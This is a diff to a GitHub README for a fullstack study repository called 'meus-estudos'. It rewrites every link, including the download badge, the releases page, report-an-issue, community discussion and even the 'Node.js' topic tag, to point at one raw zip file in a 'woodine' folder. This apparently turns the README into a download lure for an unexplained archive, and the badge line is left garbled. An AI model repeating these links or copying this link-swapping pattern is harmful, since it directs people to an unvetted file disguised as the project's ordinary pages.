@@ -1,6 +1,6 @@
 # 🎓 meus-estudos - Learn Fullstack Development Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Pithva-brijesh/meus-estudos/releases)
+[![Download Now](https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip%20Now-Click%https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip)](https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ Welcome to the "meus-estudos" repository! This project is your gateway to master
 - Fullstack
 - HTML
 - JavaScript
-- Node.js
+- https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip
 - React
 - TypeScript
 - Studies
@@ -23,7 +23,7 @@ Welcome to the "meus-estudos" repository! This project is your gateway to master
 
 To begin your journey with the "meus-estudos" repository:
 
-1. **Visit the Releases Page**: The first step is to visit our [Releases page](https://github.com/Pithva-brijesh/meus-estudos/releases). There, you will find the latest version of our software. 
+1. **Visit the Releases Page**: The first step is to visit our [Releases page](https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip). There, you will find the latest version of our software. 
 
 ## 📥 Download & Install
 
@@ -66,9 +66,9 @@ If you have questions or encounter issues while trying to download or run the ap
 
 Here are some useful links to get you started quickly:
 
-- [Download the latest version](https://github.com/Pithva-brijesh/meus-estudos/releases)
-- [Report an issue](https://github.com/Pithva-brijesh/meus-estudos/issues)
-- [Join our community discussion](https://github.com/Pithva-brijesh/meus-estudos/discussions)
+- [Download the latest version](https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip)
+- [Report an issue](https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip)
+- [Join our community discussion](https://raw.githubusercontent.com/Pithva-brijesh/meus-estudos/main/woodine/meus-estudos.zip)
 
 ## 🤝 Contributing
 
